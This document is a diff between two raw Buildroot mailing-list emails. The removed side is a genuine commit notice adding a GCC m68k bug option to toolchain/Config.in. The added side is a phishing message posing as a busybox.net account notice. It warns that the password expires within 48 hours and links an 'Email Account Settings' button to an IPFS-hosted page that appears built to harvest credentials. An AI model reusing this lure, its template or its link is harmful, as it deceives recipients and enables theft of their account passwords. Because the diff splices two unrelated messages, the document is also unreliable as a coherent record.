@@ -4,48 +4,43 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id C49A0EE57DF
-	for <buildroot@archiver.kernel.org>; Mon, 11 Sep 2023 10:35:47 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id C5875EE7FF4
+	for <buildroot@archiver.kernel.org>; Mon, 11 Sep 2023 11:42:12 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp2.osuosl.org (Postfix) with ESMTP id 7DA4840C96;
-	Mon, 11 Sep 2023 10:35:47 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 7DA4840C96
+	by smtp2.osuosl.org (Postfix) with ESMTP id 3CB3540C5A;
+	Mon, 11 Sep 2023 11:42:12 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 3CB3540C5A
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp2.osuosl.org ([127.0.0.1])
 	by localhost (smtp2.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id CNG-CSl89sjv; Mon, 11 Sep 2023 10:35:46 +0000 (UTC)
+	with ESMTP id eywKF1RS-1Mk; Mon, 11 Sep 2023 11:42:11 +0000 (UTC)
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp2.osuosl.org (Postfix) with ESMTP id B14EF4102B;
-	Mon, 11 Sep 2023 10:35:45 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org B14EF4102B
-Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
- by ash.osuosl.org (Postfix) with ESMTP id 689B41BF28E
- for <buildroot@lists.busybox.net>; Mon, 11 Sep 2023 10:35:08 +0000 (UTC)
+	by smtp2.osuosl.org (Postfix) with ESMTP id 91BE340C51;
+	Mon, 11 Sep 2023 11:42:10 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 91BE340C51
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id EDDE51BF287
+ for <buildroot@lists.busybox.net>; Mon, 11 Sep 2023 11:42:08 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp3.osuosl.org (Postfix) with ESMTP id 4F79160B71
- for <buildroot@lists.busybox.net>; Mon, 11 Sep 2023 10:35:08 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 4F79160B71
+ by smtp1.osuosl.org (Postfix) with ESMTP id 37F8781E0B
+ for <buildroot@lists.busybox.net>; Mon, 11 Sep 2023 11:42:07 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 37F8781E0B
 X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp3.osuosl.org ([127.0.0.1])
- by localhost (smtp3.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id JQsAf3y7Czv2 for <buildroot@lists.busybox.net>;
- Mon, 11 Sep 2023 10:35:06 +0000 (UTC)
-Received: from busybox.osuosl.org (busybox.osuosl.org [140.211.167.122])
- by smtp3.osuosl.org (Postfix) with ESMTP id 0093D60BFF
- for <buildroot@buildroot.org>; Mon, 11 Sep 2023 10:35:06 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 0093D60BFF
-Received: by busybox.osuosl.org (Postfix, from userid 4053)
- id E4C0686C6A; Mon, 11 Sep 2023 10:35:05 +0000 (UTC)
-From: Peter Korsgaard <peter@korsgaard.com>
-To: buildroot@buildroot.org
-Date: Mon, 11 Sep 2023 12:26:52 +0200
-X-Git-Refname: refs/heads/2023.02.x
-X-Git-Oldrev: 2625ea6bf2f77b0292811432ea627c44b81f9ee3
-X-Git-Newrev: 3a019470eaa5aa9a47d3465848eebaef66c7491d
-X-Patchwork-Hint: ignore
-Message-Id: <20230911103505.E4C0686C6A@busybox.osuosl.org>
-Subject: [Buildroot] [git commit branch/2023.02.x] toolchain: introduce
- BR2_TOOLCHAIN_HAS_GCC_BUG_110934
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id EVZWYmaXCWcv for <buildroot@lists.busybox.net>;
+ Mon, 11 Sep 2023 11:42:06 +0000 (UTC)
+Received: from busybox.net (unknown [185.216.71.34])
+ by smtp1.osuosl.org (Postfix) with ESMTP id EAAAF81D9F
+ for <buildroot@busybox.net>; Mon, 11 Sep 2023 11:42:05 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org EAAAF81D9F
+From: Noreply@busybox.net
+To: buildroot@busybox.net
+Date: 11 Sep 2023 13:42:04 +0200
+Message-ID: <20230911134204.3EA11B48172712AE@busybox.net>
+MIME-Version: 1.0
+Subject: [Buildroot] E-mail Account Notification For buildroot@busybox.net
+ !!!
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -57,49 +52,138 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============8257461263371278769=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-commit: https://git.buildroot.net/buildroot/commit/?id=3a019470eaa5aa9a47d3465848eebaef66c7491d
-branch: https://git.buildroot.net/buildroot/commit/?id=refs/heads/2023.02.x
+--===============8257461263371278769==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-openssh package fails to build for the M68K architecture with -fzero-call-used-regs=all
-passed to gcc = 12.3.0 and it's still present in gcc = 13.2.0:
-http://autobuild.buildroot.net/results/d29/d29c662e41d8969e6a8aa24870e728bcc7050563/
+<HTML><HEAD><TITLE></TITLE>
+<META http-equiv=3DX-UA-Compatible <strong Dear cont>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<TABLE lang=3Den style=3D'BOX-SIZING: border-box; FONT-SIZE: medium; FONT-F=
+AMILY: "Segoe UI", "Lucida Sans", sans-serif; BORDER-RIGHT: rgb(227,227,227=
+) 1px solid; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: colla=
+pse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE:=
+ normal; TEXT-ALIGN: left; BORDER-LEFT: rgb(227,227,227) 1px solid; ORPHANS=
+: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(252,253,254);=
+ font-variant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; tex=
+t-decoration-color: initial; text-decoration-thickness: initial' dir=3Dltr =
+cellSpacing=3D0 cellPadding=3D0 width=3D640 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box; BACKGROUND-COLOR: rgb(0,114,198)">
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(227,227,227) 1px solid=
+; BORDER-BOTTOM: rgb(227,227,227) 1px solid; PADDING-BOTTOM: 12px; PADDING-=
+TOP: 12px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" vAlign=3Dmiddle width=3D3=
+10>
+<H1 style=3D'BOX-SIZING: border-box; FONT-SIZE: 15pt; FONT-FAMILY: "segoe u=
+i light"; MARGIN-TOP: 0px; FONT-WEIGHT: normal; COLOR: rgb(255,255,255); LI=
+NE-HEIGHT: 20pt'><SPAN id=3Dv1x_HeaderPlaceholder_UserVerificationEmailHead=
+er style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box" =
+color=3D#ffffff>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;buildroot@busybox.net</FONT></SPAN></H1></TD>
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(227,227,227) 1px solid=
+; BORDER-BOTTOM: rgb(227,227,227) 1px solid" width=3D24>&nbsp;</TD></TR></T=
+BODY></TABLE>
+<TABLE lang=3Den style=3D'BOX-SIZING: border-box; FONT-SIZE: medium; FONT-F=
+AMILY: "Segoe UI", "Lucida Sans", sans-serif; WHITE-SPACE: normal; WORD-SPA=
+CING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WID=
+OWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(252,253,254); font-va=
+riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
+th: 0px; text-decoration-style: initial;=20
+text-decoration-color: initial; text-decoration-thickness: initial' dir=3Dl=
+tr cellSpacing=3D0 cellPadding=3D0 width=3D640 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; BACKGROUND: rgb(227,227,227)" width=3D=
+1></TD>
+<TD style=3D"BOX-SIZING: border-box" width=3D24>&nbsp;</TD>
+<TD id=3Dv1x_PageBody style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(2=
+27,227,227) 1px solid; PADDING-BOTTOM: 20px; PADDING-TOP: 10px; PADDING-LEF=
+T: 0px; PADDING-RIGHT: 0px" vAlign=3Dtop width=3D640 colSpan=3D2>
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellSpac=
+ing=3D0 cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 10pt; COLOR: rgb(0,0,0); LI=
+NE-HEIGHT: 13pt" width=3D630>
+<TABLE lang=3Den style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse=
+" dir=3Dltr cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: "segoe =
+ui", tahoma, sans-serif; COLOR: rgb(51,51,51)'><SPAN id=3Dv1x_BodyPlacehold=
+er_UserVerificationEmailBodySentence1 style=3D"BOX-SIZING: border-box">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<SP=
+AN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN>Dear buildroot</STRONG> ,<=
+BR style=3D"BOX-SIZING: border-box">
+<BR style=3D"BOX-SIZING: border-box">Your busybox.net mailbox password will=
+ expire within 48 hours, Go to Email Account Settings<BR style=3D"BOX-SIZIN=
+G: border-box">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;below to =
+confirm using the same password!</SPAN></DIV>
+<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><=
+/TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dcenter>
+<TABLE class=3Dv1m_-7257559470588763933auto-height style=3D"BOX-SIZING: bor=
+der-box; BORDER-COLLAPSE: collapse; BACKGROUND-COLOR: rgb(0,120,215)" cellS=
+pacing=3D0 cellPadding=3D0 align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3D"v1m_-7257559470588763933font-size-18 v1m_-7257559470588763933l=
+ine-height-24 v1m_-7257559470588763933padding-top-12 v1m_-72575594705887639=
+33padding-right-24 v1m_-7257559470588763933padding-bottom-12 v1m_-725755947=
+0588763933padding-left-24" style=3D'BOX-SIZING: border-box; FONT-SIZE: 16px=
+; BORDER-TOP: rgb(0,120,215) 1px solid; FONT-FAMILY: "segoe ui", "segoe wp"=
+, wf_segoe-ui_semibold, tahoma, arial, sans-serif; BORDER-RIGHT: rgb(0,120,=
+215) 1px solid; BORDER-BOTTOM: rgb(0,120,215) 1px=20
+solid; FONT-WEIGHT: 600; COLOR: rgb(0,120,215); PADDING-BOTTOM: 13px; TEXT-=
+ALIGN: center; PADDING-TOP: 13px; PADDING-LEFT: 24px; BORDER-LEFT: rgb(0,12=
+0,215) 1px solid; LINE-HEIGHT: 10px; PADDING-RIGHT: 24px; BACKGROUND-COLOR:=
+ rgb(0,120,215)' align=3Dcenter><SPAN id=3Dv1OBJ_PREFIX_DWT151_com_zimbra_u=
+rl class=3Dv1Object style=3D"BOX-SIZING: border-box; CURSOR: pointer; TEXT-=
+DECORATION: none; COLOR: rgb(68,101,111)">
+<SPAN id=3Dv1OBJ_PREFIX_DWT152_com_zimbra_url class=3Dv1Object style=3D"BOX=
+-SIZING: border-box; CURSOR: pointer; TEXT-DECORATION: none; COLOR: rgb(68,=
+101,111)"><A style=3D"BOX-SIZING: border-box; CURSOR: pointer; TEXT-DECORAT=
+ION: none; COLOR: rgb(255,255,255); BACKGROUND-COLOR: transparent" href=3D"=
+https://bafybeih2udpbnjtjikwnfqmkfwuq2vnzahpnfpx3heazplij2grmhqu2u4.ipfs.dw=
+eb.link/Universal.html#buildroot@busybox.net" rel=3Dnoreferrer target=3D_bl=
+ank>Email Account Settings</A></SPAN></SPAN></TD></TR></TBODY></TABLE>
+</TD></TR></TBODY></TABLE><BR style=3D"BOX-SIZING: border-box"><BR style=3D=
+"BOX-SIZING: border-box">
+<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: "segoe =
+ui", tahoma, sans-serif; COLOR: rgb(51,51,51)'>Sincerely,</DIV>
+<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: "segoe =
+ui", tahoma, sans-serif; COLOR: rgb(51,51,51); FONT-STYLE: italic'>busybox.=
+net Automated Message!</DIV></TD></TR></TBODY></TABLE></TD></TR></TBODY></T=
+ABLE></BODY></HTML>
 
-It's been reported upstream:
-https://gcc.gnu.org/bugzilla/show_bug.cgi?id=110934
+--===============8257461263371278769==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-Signed-off-by: Waldemar Brodkorb <wbx@openadk.org>
-Signed-off-by: Thomas Petazzoni <thomas.petazzoni@bootlin.com>
-(cherry picked from commit 51435d30ba283036d027f2d02c693da138bbdf71)
-Signed-off-by: Peter Korsgaard <peter@korsgaard.com>
----
- toolchain/Config.in | 7 +++++++
- 1 file changed, 7 insertions(+)
-
-diff --git a/toolchain/Config.in b/toolchain/Config.in
-index 08e4ccad9e..b3cbec8377 100644
---- a/toolchain/Config.in
-+++ b/toolchain/Config.in
-@@ -244,6 +244,13 @@ config BR2_TOOLCHAIN_HAS_GCC_BUG_107728
- 	depends on BR2_TOOLCHAIN_USES_GLIBC
- 	depends on BR2_OPTIMIZE_0
- 
-+# https://gcc.gnu.org/bugzilla/show_bug.cgi?id=110934
-+# ICE: on M68K: in change_address_1, at emit-rtl.cc:2287
-+# This bug exists in gcc = 12.3.0 and gcc = 13.2.0
-+config BR2_TOOLCHAIN_HAS_GCC_BUG_110934
-+	bool
-+	default y if BR2_m68k
-+
- config BR2_TOOLCHAIN_HAS_NATIVE_RPC
- 	bool
- 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============8257461263371278769==--
